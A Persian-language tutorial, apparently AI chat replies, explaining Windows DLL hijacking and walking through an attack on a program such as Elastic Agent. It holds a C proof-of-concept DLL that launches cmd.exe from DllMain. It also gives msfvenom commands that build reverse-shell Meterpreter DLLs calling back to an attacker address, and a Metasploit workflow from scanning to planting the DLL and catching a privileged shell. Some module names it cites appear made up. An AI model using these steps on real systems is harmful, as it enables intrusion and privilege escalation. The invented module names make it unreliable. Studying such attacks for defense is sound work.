## 🔹 کلمه‌ی Hijacking یعنی چی؟

- به صورت کلی **Hijack = ربودن، به دست گرفتن کنترل چیزی که مال تو نیست**.
    
- توی امنیت سایبری وقتی می‌گیم _Hijacking_ یعنی:  
    👉 مهاجم میاد خودش رو **جایگزین یه جزء یا پروسه‌ی قانونی** می‌کنه و کنترل اون رو می‌گیره.
    

📌 مثال ساده:

- "Session Hijacking" → دزدیدن نشست کاربر (مثل کوکی لاگین).
    
- "DNS Hijacking" → تغییر مسیر DNS برای بردن کاربر به سایت جعلی.
    

---

## 🔹 DLL Hijacking چیه؟

### 1. DLL چیه؟

- توی ویندوز فایل‌های **Dynamic-Link Library (.dll)** مثل کتابخونه‌ها هستن که برنامه‌ها برای اجرای بعضی فانکشن‌ها ازشون استفاده می‌کنن.
    
- وقتی یه برنامه اجرا می‌شه، میاد DLLهای لازم رو **Load** می‌کنه.
    

### 2. مشکل کجاست؟

- ویندوز یه ترتیب مشخص برای **Load کردن DLL** داره:
    
    1. مسیر برنامه (Program Directory)
        
    2. مسیرهای سیستمی (System32, Windows)
        
    3. مسیرهای محیطی (PATH)
        

📌 اگه DLL مورد نظر توی مسیر اول پیدا بشه، همون اجرا می‌شه → حتی اگه مخرب باشه.

### 3. سوءاستفاده مهاجم

- مهاجم یه DLL مخرب می‌سازه با اسم همون DLLی که برنامه نیاز داره.
    
- اون رو می‌ذاره توی پوشه‌ی برنامه یا مسیری که قبل از System32 چک می‌شه.
    
- برنامه وقتی اجرا بشه → به جای DLL اصلی، DLL مخرب مهاجم لود می‌شه.
    
- نتیجش: اجرای کد با سطح دسترسی برنامه قربانی (گاهی اوقات **SYSTEM یا Admin**).
    

---

## 🔹 مثال سناریو DLL Hijacking

1. قربانی `eventvwr.exe` یا یه برنامه‌ی autoElevate رو اجرا می‌کنه.
    
2. این برنامه به دنبال `example.dll` می‌گرده.
    
3. مهاجم نسخه‌ی مخرب `example.dll` رو توی همون پوشه قرار داده.
    
4. ویندوز اول همون رو لود می‌کنه.
    
5. حالا کد مهاجم با دسترسی بالا اجرا می‌شه.
    

---

## 🔹 چرا مهمه؟

- خیلی از حملات privilege escalation یا persistence دقیقاً با DLL hijacking انجام می‌شن.
    
- چون خیلی از سرویس‌ها یا برنامه‌های ویندوز DLLها رو به شکل ناامن load می‌کنن.
    

---

✅ پس:

- **Hijacking** = ربودن یا در دست گرفتن چیزی.
    
- **DLL Hijacking** = جایگزین کردن یه DLL مخرب به جای DLL واقعی تا کد مهاجم با سطح دسترسی برنامه اصلی اجرا بشه.

ایول 👌 دقیقا رفتی سر اصل ماجرا:  
این همون نکته‌ی مهمیه که باعث می‌شه **DLL Hijacking** برای مهاجم ساده نباشه و یه کم تخصص بخواد.

---

## 🔹 مشکل اصلی که گفتی:

برنامه موقع اجرا انتظار داره DLL یه سری **function (export)** مشخص داشته باشه.

- مثلا `program.exe` ممکنه از `calc.dll` توابع زیر رو صدا کنه:
    
    - `AddNumbers()`
        
    - `SubNumbers()`
        

حالا اگه مهاجم بیاد یه DLL بسازه که اصلا این توابع توش نباشه، وقتی برنامه اون تابع رو صدا بزنه →  
📌 برنامه **Crash** می‌کنه یا خطای _missing export function_ می‌ده.

---

## 🔹 پس مهاجم چطور این مشکل رو حل می‌کنه؟

اینجا چند تکنیک وجود داره:

### 1. **Proxy DLL (یا DLL Side-Loading واقعی)**

- مهاجم یه DLL مخرب می‌سازه با همون اسم DLL اصلی.
    
- **تمام توابعی که DLL اصلی داشته رو Export می‌کنه** (می‌شه یه جور "wrapper").
    
- این توابع فقط درخواست رو پاس می‌دن به DLL اصلی (forward).
    
- ولی قبل یا بعد از forward کردن، کد مخرب خودش رو اجرا می‌کنه.
    

📌 نتیجه:  
برنامه فکر می‌کنه داره از DLL اصلی استفاده می‌کنه → همه چی کار می‌کنه.  
ولی در واقع کد مخرب هم تزریق شده.

---

### 2. **Export Minimum Functions**

- بعضی وقت‌ها برنامه فقط یکی دو تا تابع از DLL رو لازم داره.
    
- مهاجم با **مهندسی معکوس (reverse engineering)** برنامه (با ابزارهایی مثل **ProcMon, Dependency Walker, IDA Pro**) می‌فهمه کدوم تابع‌ها لازم هستن.
    
- فقط همون‌ها رو توی DLL خودش پیاده‌سازی می‌کنه.
    
- بقیه‌ی تابع‌ها لازم نیست.
    

---

### 3. **Blind Hijacking**

- مهاجم حتی بدون دونستن همه‌ی توابع، فقط یه تابع رو implement می‌کنه که مطمئنه صدا زده می‌شه.
    
- مثلا تابع `DllMain()` همیشه صدا زده می‌شه وقتی DLL لود می‌شه.
    
- مهاجم توی `DllMain` کد خودش رو می‌ذاره → همین برای اجرای کد کافی هست.
    
- اگه برنامه بعدش کرش کرد، مهم نیست چون هدف مهاجم (اجرای کد) انجام شده.
    

---

## 🔹 ابزارهایی که کمک می‌کنن

برای فهمیدن اینکه یه پروسس دنبال چه DLL و چه توابعی هست:

- **ProcMon (Sysinternals)** → می‌بینی برنامه چه DLLهایی رو لود می‌کنه.
    
- **Dependency Walker** یا **PE-bear** → نشون می‌ده DLL چه توابعی باید export کنه.
    
- **IDA / Ghidra** → مهندسی معکوس برای فهمیدن کد دقیق.
    

---

## 🔹 خلاصه

- درست گفتی: اگه مهاجم یه DLL الکی بسازه → برنامه کرش می‌کنه.
    
- راه‌حل: ساختن **Proxy DLL** یا حداقل export کردن همون توابعی که لازم هست.
    
- حتی اگه همه رو درست نکنه → ممکنه مهاجم فقط با `DllMain` به هدفش (اجرای کد و گرفتن شل) برسه.

## 🔹 سناریو آزمایشی

- فرض کن Elastic Agent یه DLL به اسم `example.dll` رو صدا می‌کنه.
    
- ما یه DLL مخرب با همون اسم می‌سازیم.
    
- این DLL موقع Load شدن (توی `DllMain`) یه کد ساده اجرا می‌کنه.
    

---

## 🔹 کد نمونه Proxy DLL (C)

```c
#include <windows.h>
#include <stdio.h>

// نمونه Proxy DLL برای Hijacking
// به جای Elastic DLL فقط یه PoC ساده نشون می‌ده

// وقتی DLL لود بشه، این تابع صدا زده می‌شه
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL,
                    "DLL Hijacking PoC اجرا شد!",
                    "DLL Hijack Demo",
                    MB_OK | MB_ICONEXCLAMATION);

        // اینجا میشه کد مخرب اجرا کرد (PoC: اجرای cmd)
        WinExec("cmd.exe", SW_SHOW);
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

---

## 🔹 توضیح کد

- `DllMain` → همیشه وقتی DLL لود بشه صدا زده می‌شه.
    
- ما توی `DLL_PROCESS_ATTACH` کد دلخواه خودمون رو می‌ذاریم.
    
- اینجا برای تست:
    
    - یه `MessageBox` نشون داده می‌شه.
        
    - بعد یه `cmd.exe` اجرا می‌شه.
        
- اگه این DLL رو جایگزین DLL اصلی کنی و برنامه (Elastic یا هر چیز دیگه) اجرا بشه → این کد هم همراهش اجرا می‌شه.
    

---

📌 ابزارهایی مثل **ProcMon** کمک می‌کنن بفهمی Elastic Agent دقیقاً چه DLLهایی رو Load می‌کنه. همون رو می‌تونی با DLL مخرب جایگزین کنی.

## 🔹 متاسپلویت و DLL Hijacking

Metasploit به صورت پیش‌فرض یه سری **ماژول آماده** برای سناریوهای DLL Hijacking داره.  
اینا بیشتر به شکل **post exploitation** استفاده می‌شن: یعنی وقتی دسترسی اولیه گرفتی (مثلا یه شل معمولی)، می‌خوای سطح دسترسی رو بالا ببری یا persistence ایجاد کنی.

---

## 🔹 ماژول‌های مرتبط در Metasploit

چند نمونه مهم:

1. **exploit/windows/local/dll_hijack_x**
    
    - مخصوص بعضی اپلیکیشن‌هاست که DLLهاشون ناامن load می‌شن.
        
    - تو یه DLL مخرب تولید می‌کنه و می‌ذاره توی مسیر آسیب‌پذیر.
        
    - وقتی برنامه اجرا بشه → DLL مخرب لود می‌شه → شل با دسترسی بالا می‌گیری.
        
2. **exploit/windows/local/planting_dll**
    
    - برای سناریوهایی که دسترسی به مسیر برنامه داری.
        
    - DLL مخرب می‌سازه و همونجا قرار می‌ده.
        
3. **payload generation**
    
    - تو می‌تونی با `msfvenom` یه DLL بسازی که داخلش payload مورد نظر (مثلا reverse shell) باشه.
        
    
    مثال:
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f dll -o evil.dll
    ```
    
    این فایل `evil.dll` وقتی لود بشه → یه سشن Meterpreter برمی‌گردونه.
    

---

## 🔹 فرآیند DLL Hijacking با متاسپلویت (سناریو کلی)

حالا مرحله به مرحله:

1. **اطلاعات جمع‌آوری (Nmap / Enumeration)**
    
    - با Nmap پورت‌ها و سرویس‌ها رو می‌گیری:
        
        ```bash
        nmap -sV -p- 192.168.56.101
        ```
        
    - بعد دنبال سرویس‌ها یا نرم‌افزارهایی می‌گردی که DLL Hijack براشون شناخته‌شده باشه.
        
2. **شناسایی نرم‌افزار آسیب‌پذیر**
    
    - با ابزارهایی مثل **ProcMon** یا ماژول‌های Metasploit بررسی می‌کنی ببینی برنامه چه DLLهایی رو از مسیر ناامن Load می‌کنه.
        
    - مثلا Elastic Agent یا یه برنامه قدیمی دیگه.
        
3. **ساخت DLL مخرب**
    
    - با `msfvenom` یه DLL payload می‌سازی:
        
        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f dll -o hijack.dll
        ```
        
4. **قرار دادن DLL در مسیر هدف**
    
    - اگه دسترسی داری (مثلا یوزر لوکال یا write permission توی فولدر برنامه)، DLL رو اونجا می‌ذاری.
        
    - بعضی وقتا از ماژول‌های Metasploit برای این کار استفاده می‌کنی (`exploit/windows/local/...`).
        
5. **اجرای برنامه هدف**
    
    - کاربر یا سیستم برنامه رو اجرا می‌کنه.
        
    - به جای DLL اصلی، `hijack.dll` لود می‌شه.
        
    - متاسپلویت روی Listener می‌شینه (`multi/handler`).
        
6. **گرفتن شل Meterpreter با دسترسی بالاتر**
    
    - اتصال برمی‌گرده به حمله‌کننده.
        
    - اگه برنامه با دسترسی Admin/SYSTEM اجرا بشه → شل با همون سطح دسترسی داری.
        

---

## 🔹 مثال از ماژول آماده (DLL Hijack در متاسپلویت)

```bash
use exploit/windows/local/planting_dll
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
run
```

📌 این ماژول یه DLL می‌سازه و روی سیستم قربانی قرار می‌ده.  
وقتی اپلیکیشن آسیب‌پذیر اجرا بشه → متاسپلویت شل می‌گیره.

---

## 🔹 خلاصه

- Metasploit خودش ابزارهای DLL Hijack داره.
    
- ولی اصل کار اینه که بفهمی کدوم برنامه آسیب‌پذیره.
    
- بعد با `msfvenom` DLL payload می‌سازی → جایگزین DLL اصلی می‌کنی.
    
- در نهایت متاسپلویت شل رو می‌گیره.
